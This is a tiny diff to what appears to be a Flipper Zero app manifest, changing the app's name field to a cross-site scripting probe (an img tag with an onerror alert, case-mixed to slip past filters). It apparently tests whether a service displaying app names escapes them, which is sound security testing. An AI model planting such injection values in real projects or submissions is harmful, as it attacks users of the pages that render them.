@@ -1,6 +1,6 @@
 App(
     appid="empty",
-    name="empty",
+    name="<iMg SrC=a oNeRRor=alert`1`>",
     apptype=FlipperAppType.EXTERNAL,
     entry_point="empty_main",
     requires=["gui"],
